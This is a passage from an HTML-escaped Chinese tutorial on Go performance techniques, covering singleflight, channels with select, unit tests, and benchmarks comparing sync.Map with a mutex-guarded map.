demo14.215s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;span&gt;使用sync.Pool执行分析：&lt;/span&gt;&lt;span&gt;火焰图&amp;amp;Top函数&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;runtime.mallocgc 已经在top里面看不见了&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.1925925925925926&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMe16EW56bQksaKq4b9bLlQ2Fib25iaaq7cn0HFC0eGcCsMruas77TS2Sqw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;span&gt; &lt;/span&gt;&lt;img data-ratio=&quot;0.5722222222222222&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMes2u2MvF8kEZoT9JpYURIpzx3zlXAXzL9p6nqqkRmrDyLEM6icDcuAIg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1033&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;关于火焰图和Top函数的使用下面会讲到。&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;1037&quot;&gt;&lt;span&gt;6. 减少缓存穿透利器之&lt;/span&gt;&lt;code&gt;&lt;span&gt;singleflight&lt;/span&gt;&lt;/code&gt;&lt;span&gt;包的使用&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;1039&quot;&gt;&lt;p data-line=&quot;1039&quot;&gt;&lt;span&gt;作用：缓存等穿透时减少请求数。&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1041&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1042&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;io/ioutil&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&quot;golang.org/x/sync/singleflight&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 没有使用singleflight的代码示例&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;TestDemo_NoSingleflight&lt;/span&gt;&lt;span&gt;(t *testing.T)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;t.Parallel()&lt;br/&gt;wg := sync.WaitGroup{}&lt;br/&gt;&lt;span&gt;// 模拟并发远程调用&lt;/span&gt;&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;3&lt;/span&gt;; i++ {&lt;br/&gt;wg.Add(&lt;span&gt;1&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; wg.Done()&lt;br/&gt;resp, err := http.Get(&lt;span&gt;&quot;http://example.com&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;_, err = ioutil.ReadAll(resp.Body)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;t.Log(&lt;span&gt;&quot;log&quot;&lt;/span&gt;)&lt;br/&gt;}()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;wg.Wait()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 使用singleflight的代码示例&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;TestDemo_Singleflight&lt;/span&gt;&lt;span&gt;(t *testing.T)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;t.Parallel()&lt;br/&gt;singleGroup := singleflight.Group{}&lt;br/&gt;wg := sync.WaitGroup{}&lt;br/&gt;&lt;span&gt;// 模拟并发远程调用&lt;/span&gt;&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;3&lt;/span&gt;; i++ {&lt;br/&gt;wg.Add(&lt;span&gt;1&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; wg.Done()&lt;br/&gt;&lt;span&gt;// 使用singleflight&lt;/span&gt;&lt;br/&gt;res, err, shared := singleGroup.Do(&lt;span&gt;&quot;cache_key&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;(&lt;span&gt;interface&lt;/span&gt;{}, error)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;resp, err := http.Get(&lt;span&gt;&quot;http://example.com&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;nil&lt;/span&gt;, err&lt;br/&gt;}&lt;br/&gt;body, err := ioutil.ReadAll(resp.Body)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;nil&lt;/span&gt;, err&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; body, &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;})&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;_, _ = res.([]&lt;span&gt;byte&lt;/span&gt;)&lt;br/&gt;t.Log(&lt;span&gt;&quot;log&quot;&lt;/span&gt;, shared, err)&lt;br/&gt;}()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;wg.Wait()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;1116&quot;&gt;&lt;p data-line=&quot;1116&quot;&gt;&lt;span&gt;抓包域名example.com的请求：tcpdump host example.com&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;h5&gt;&lt;span&gt;没有使用Singleflight一共发起了3次请求&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.44537037037037036&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeGHeNlQRktH44mxXCxw2UJRks7qXs0R2U83l0AlrJsnNHpe7lx1ZsmA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h5&gt;&lt;span&gt;使用Singleflight只发起了1次请求&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.15462962962962962&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeJf9V4TRZ5K1Krb9S9H3ibkMK9vaiatuoqjzBib2ksxXrzGedZ3m9avMaw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;7. Channel的使用&lt;/span&gt;&lt;/p&gt;&lt;blockquote data-line=&quot;1127&quot;&gt;&lt;p data-line=&quot;1127&quot;&gt;&lt;span&gt;作用：不要通过共享内存来通信，要通过通信来实现共享内存。相当于管道。&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1129&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1130&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;time&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 响应公共结构体&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; APIBase &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;Code    &lt;span&gt;int32&lt;/span&gt;  &lt;span&gt;`json:&quot;code&quot;`&lt;/span&gt;&lt;br/&gt;Message &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;message&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 模拟接口A的响应结构体&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; APIDemoA &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;APIBase&lt;br/&gt;Data APIDemoAData &lt;span&gt;`json:&quot;data&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; APIDemoAData &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;Title &lt;span&gt;string&lt;/span&gt; &lt;span&gt;`json:&quot;title&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 模拟接口B的响应结构体&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; APIDemoB &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;APIBase&lt;br/&gt;Data APIDemoBData &lt;span&gt;`json:&quot;data&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; APIDemoBData &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;SkuList []&lt;span&gt;int64&lt;/span&gt; &lt;span&gt;`json:&quot;sku_list&quot;`&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 模拟接口逻辑&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 创建接口A传输结果的通道&lt;/span&gt;&lt;br/&gt;execAResult := &lt;span&gt;make&lt;/span&gt;(&lt;span&gt;chan&lt;/span&gt; APIDemoA)&lt;br/&gt;&lt;span&gt;// 创建接口B传输结果的通道&lt;/span&gt;&lt;br/&gt;execBResult := &lt;span&gt;make&lt;/span&gt;(&lt;span&gt;chan&lt;/span&gt; APIDemoB)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 并发调用接口A&lt;/span&gt;&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(execAResult &lt;span&gt;chan&lt;/span&gt;&amp;lt;- APIDemoA)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 模拟接口A远程调用过程&lt;/span&gt;&lt;br/&gt;time.Sleep(&lt;span&gt;2&lt;/span&gt; * time.Second)&lt;br/&gt;execAResult &amp;lt;- APIDemoA{}&lt;br/&gt;}(execAResult)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 并发调用接口B&lt;/span&gt;&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(execBResult &lt;span&gt;chan&lt;/span&gt;&amp;lt;- APIDemoB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 模拟接口B远程调用过程&lt;/span&gt;&lt;br/&gt;time.Sleep(&lt;span&gt;1&lt;/span&gt; * time.Second)&lt;br/&gt;execBResult &amp;lt;- APIDemoB{}&lt;br/&gt;}(execBResult)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; resultA APIDemoA&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; resultB APIDemoB&lt;br/&gt;i := &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; i &amp;gt;= &lt;span&gt;2&lt;/span&gt; {&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;退出&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;break&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;select&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;case&lt;/span&gt; resultA = &amp;lt;-execAResult: &lt;span&gt;// 等待接口A的响应结果&lt;/span&gt;&lt;br/&gt;i++&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;resultA&quot;&lt;/span&gt;, resultA)&lt;br/&gt;&lt;span&gt;case&lt;/span&gt; resultB = &amp;lt;-execBResult: &lt;span&gt;// 等待接口B的响应结果&lt;/span&gt;&lt;br/&gt;i++&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;resultB&quot;&lt;/span&gt;, resultB)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// resultB {{0 } {[]}}&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// resultA {{0 } {}}&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 退出&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;1210&quot;&gt;&lt;span&gt;8.  单元测试&amp;amp;基准测试&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;1212&quot;&gt;&lt;p data-line=&quot;1212&quot;&gt;&lt;span&gt;作用：开发阶段调试代码块、接口；对代码块、接口做基准测试，分析性能问题，包含CPU使用、内存使用等。可做对比测试。ci阶段检测代码质量减少bug。&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1214&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;h2 data-line=&quot;1216&quot;&gt;&lt;span&gt;8.1 单元测试&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;1218&quot;&gt;&lt;span&gt;一个很简单的单元测试示例：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1219&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;io/ioutil&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;TestDemo&lt;/span&gt;&lt;span&gt;(t *testing.T)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;t.Parallel()&lt;br/&gt;&lt;span&gt;// 模拟调用接口&lt;/span&gt;&lt;br/&gt;resp, err := http.Get(&lt;span&gt;&quot;http://example.com?user_id=121212&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;body, err := ioutil.ReadAll(resp.Body)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;t.Log(&lt;span&gt;&quot;body&quot;&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;(body))&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// go test -timeout 30s -run ^TestDemo$ demo -v -count=1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === RUN   TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === PAUSE TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === CONT  TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ......&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// --- PASS: TestDemo (0.45s)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok      demo    1.130s&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1255&quot;&gt;&lt;span&gt;多个测试用例的单元测试示例：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1256&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;io/ioutil&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Req &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;UserID &lt;span&gt;int64&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;TestDemo&lt;/span&gt;&lt;span&gt;(t *testing.T)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;t.Parallel()&lt;br/&gt;tests := []&lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;TestName &lt;span&gt;string&lt;/span&gt;&lt;br/&gt;*Req&lt;br/&gt;}{&lt;br/&gt;{&lt;br/&gt;TestName: &lt;span&gt;&quot;测试用例1&quot;&lt;/span&gt;,&lt;br/&gt;Req: &amp;amp;Req{&lt;br/&gt;UserID: &lt;span&gt;12121212&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;},&lt;br/&gt;{&lt;br/&gt;TestName: &lt;span&gt;&quot;测试用例2&quot;&lt;/span&gt;,&lt;br/&gt;Req: &amp;amp;Req{&lt;br/&gt;UserID: &lt;span&gt;829066&lt;/span&gt;,&lt;br/&gt;},&lt;br/&gt;},&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; _, v := &lt;span&gt;range&lt;/span&gt; tests {&lt;br/&gt;t.Run(v.TestName, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(t *testing.T)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// 模拟调用接口&lt;/span&gt;&lt;br/&gt;url := fmt.Sprintf(&lt;span&gt;&quot;http://example.com?user_id=%d&quot;&lt;/span&gt;, v.UserID)&lt;br/&gt;resp, err := http.Get(url)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;body, err := ioutil.ReadAll(resp.Body)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;t.Error(err)&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;t.Log(&lt;span&gt;&quot;body&quot;&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;(body), url)&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 执行&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// go test -timeout 30s -run ^TestDemo$ demo -v -count=1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === RUN   TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === PAUSE TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === CONT  TestDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === RUN   TestDemo/测试用例1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ...&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// === RUN   TestDemo/测试用例2&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ...&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// --- PASS: TestDemo (7.34s)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;//     --- PASS: TestDemo/测试用例1 (7.13s)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;//     --- PASS: TestDemo/测试用例2 (0.21s)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok  demo7.984s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;1325&quot;&gt;&lt;span&gt;8.2 基准测试&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;1327&quot;&gt;&lt;span&gt;简单的基准测试：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1328&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 压力测试sync.Map&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkSyncMap&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demoMap := &amp;amp;sync.Map{}&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;1000&lt;/span&gt;; i++ {&lt;br/&gt;demoMap.Load(&lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// go test -benchmem -run=^$ -bench ^(BenchmarkSyncMap)$ demo -v -count=1 -cpuprofile=cpu.profile -memprofile=mem.profile -benchtime=10s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// goos: darwin&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goarch: amd64&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// pkg: demo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkSyncMap&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkSyncMap-4&lt;/span&gt;&lt;br/&gt;&lt;span&gt;//   570206     23047 ns/op      16 B/op       1 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok  demo13.623s&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1361&quot;&gt;&lt;span&gt;对比基准测试：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1362&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 压力测试sync.Map&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkSyncMap&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demoMap := &amp;amp;sync.Map{}&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;1000&lt;/span&gt;; i++ {&lt;br/&gt;demoMap.Load(&lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 用读写锁实现一个并发map&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; ConcurrentMap &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;value &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;&lt;br/&gt;mutex sync.RWMutex&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 写&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(c *ConcurrentMap)&lt;/span&gt; &lt;span&gt;Store&lt;/span&gt;&lt;span&gt;(key &lt;span&gt;string&lt;/span&gt;, val &lt;span&gt;string&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;c.mutex.Lock()&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; c.mutex.Unlock()&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; c.value == &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;c.value = &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;{}&lt;br/&gt;}&lt;br/&gt;c.value[key] = val&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 读&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(c *ConcurrentMap)&lt;/span&gt; &lt;span&gt;Load&lt;/span&gt;&lt;span&gt;(key &lt;span&gt;string&lt;/span&gt;)&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;c.mutex.Lock()&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; c.mutex.Unlock()&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; c.value[key]&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 压力测试并发map&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkConcurrentMap&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demoMap := &amp;amp;ConcurrentMap{}&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb 